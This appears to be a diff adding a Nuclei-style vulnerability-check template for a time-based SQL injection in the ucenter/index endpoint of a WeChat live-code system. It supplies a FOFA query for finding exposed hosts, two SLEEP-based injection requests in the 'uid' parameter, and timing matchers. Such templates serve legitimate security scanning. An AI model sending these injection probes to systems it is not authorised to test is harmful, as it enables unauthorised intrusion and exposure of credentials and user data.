@@ -1,0 +1,29 @@
+id: WX-ucenter_index-sql
+
+info:
+  name: "微信活码系统 ucenter 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body=".qn-user-login"
+      微信活码系统 ucenter/index 接口存在SQL注入漏洞。攻击者可通过构造恶意SQL语句实现数据库敏感信息泄露，包括管理员后台凭证及用户隐私数据。在具备高权限写入条件下，攻击者可向服务器植入恶意代码文件，最终达成系统权限接管。
+  reference:
+  - https://mp.weixin.qq.com/s/3Sw7CVdk-OTav7VVLS-Emg?token=1966770530&lang=zh_CN
+  tags: 微信活码系统
+
+http:
+- raw:
+  - |
+    GET /ucenter/index/?uid=1)%20AND%20(SELECT%203460%20FROM%20(SELECT(SLEEP(2)))RkHL)%20AND%20(1015=1015 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+  - |
+    GET /ucenter/index/?uid=1)%20AND%20(SELECT%203460%20FROM%20(SELECT(SLEEP(4)))RkHL)%20AND%20(1015=1015 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
